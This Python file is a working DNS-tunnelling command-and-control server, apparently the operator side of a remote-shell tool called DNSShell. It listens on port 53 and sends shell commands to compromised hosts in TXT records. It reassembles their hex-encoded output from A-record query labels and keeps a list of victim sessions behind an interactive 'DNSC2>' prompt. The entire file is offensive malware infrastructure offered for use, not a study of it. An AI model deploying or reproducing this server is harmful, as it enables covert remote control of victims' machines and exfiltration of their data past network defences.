import optparse
import time
import sys
import threading
from dnslib import *
import socket
import codecs

data_set = {}
sessions={}
def parse_output(request,addr,count):
    global data_set
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    rdata = A('127.0.0.1') 
    TTL = 60 * 5
    rqt = rdata.__class__.__name__
    #12345.CMD1.PAYLOAD.wei.com
    if b'CMD' in request.q.qname.label[1]:
        cm = codecs.decode(request.q.qname.label[2], "hex")
        seq_num=request.q.qname.label[1][3:]
        if seq_num.isdigit() :
            data_set[(request.q.qname.label[3],count)]=(seq_num,cm,addr)
            if addr[0] in sessions.keys():
                sys.stdout.write("\033[0;33;40m\r[!]Got %d datachunk(s).\r\033[0m" % (int(seq_num)+1))
                sys.stdout.flush()
    #12345.END.wei.com
    if b'END' in request.q.qname.label[1]:
        current_set={}
        result=""
        for i,j in data_set.keys():
            if i == request.q.qname.label[2]:
                k,l,_=data_set[(i,j)]
                try:
                    current_set[k]=str(l, encoding="utf-8")
                except:
                    current_set[k]=str(l, encoding="ISO-8859-1")
        for q in sorted(current_set):
            result+=current_set[q]
        if addr[0] in sessions.keys():
            sys.stdout.write("\033[0;37;40m\r\n[>]==============>:\n\033[0m")
            print("\033[0;35;40m"+result+"\033[0m")
            sys.stdout.flush()
        data_set={}
        if addr[0] not in sessions.keys():
            sessions[addr[0]]=result
            sys.stdout.write("\r\033[0;33;40m[!]Got a shell.\033[0m")
            sys.stdout.flush()
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.A, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()

def parse_newCMD(request,addr,count):
    global c2cmd
    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
    TTL = 60 * 5
    time.sleep(1)
    rdata = TXT(c2cmd)
    c2cmd = 'NoCMD'
    rqt = rdata.__class__.__name__
    reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
    return reply.pack()

def dns_response(data,addr,count):
    request = DNSRecord.parse(data)
    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    if qt == 'A':
        reply = parse_output(request,addr,count)
    elif qt == 'TXT':
        reply = parse_newCMD(request,addr,count)
    else:
        reply=data
    return reply
    
def check_target(s,data,addr,count):
    request = DNSRecord.parse(data)
    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]
    TTL = 60 * 5
    if qt=='TXT':
        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
        TTL = 60 * 5
        rdata = TXT('hostname')
        rqt = rdata.__class__.__name__
        reply.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
        reply=reply.pack()
    else:
        reply = parse_output(request,addr,count)
    
    s.sendto(b'%s' % reply, addr)

def StartMyDNSC2Server():
    count = 0
    global c2cmd
    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    s.bind(('',53))
    while True: 
        data, addr = s.recvfrom(1024)
        if addr[0] not in sessions.keys():
            check_target(s,data,addr,count)
        else:
            send2data=dns_response(data,addr,count)
            s.sendto(b'%s' % send2data, addr)
        count += 1

def main(ip):
    global c2cmd
    c2cmd = 'NoCMD'
    server_thread = threading.Thread(target=StartMyDNSC2Server, args=())
    server_thread.daemon = 1
    server_thread.start()
    usage='''\033[0;32;40m
DNSC2>help\033[0m
\033[0;33;40mshell cmd : run cmd on remote device.
help      : show help.
sessions  : show sessions history.\033[0m
'''
    logo='''________    _______    _________.__           .__  .__   
\______ \   \      \  /   _____/|  |__   ____ |  | |  |  
 |    |  \  /   |   \ \_____  \ |  |  \_/ __ \|  | |  |  
 |    `   \/    |    \/        \|   Y  \  ___/|  |_|  |__
/_______  /\____|__  /_______  /|___|  /\___  >____/____/
        \/         \/        \/      \/     \/           
                                                @aplyc1a  
'''
    print(logo)
    print(usage)
    while True:
        try:
            print("\033[0;32;40mDNSC2>\033[0m", end="")
            cmd=input("")
            if cmd == "help":
                print(usage)
            if cmd[0:6] == "shell ":
                c2cmd=cmd[6:]
                sys.stdout.flush()
                if not sessions:
                    print("\033[0;33;40m[!]No available sessions.\033[0m")
            if cmd == "sessions":
                print(sessions)
        except (KeyboardInterrupt, EOFError):
            sys.exit()
        except Exception:
            continue
        
if __name__=='__main__':
    parser = optparse.OptionParser('usage % prog -s <ip_addr>')
    parser.add_option('-s', dest='server_addr', type = 'string', help = 'Direct DNS queries mode.')
    
    (options,args)= parser.parse_args()
    ip=options.server_addr
    ip = "192.168.59.132"

    if ip == None :
        print(parser.usage)
        exit(0)
    main(ip)
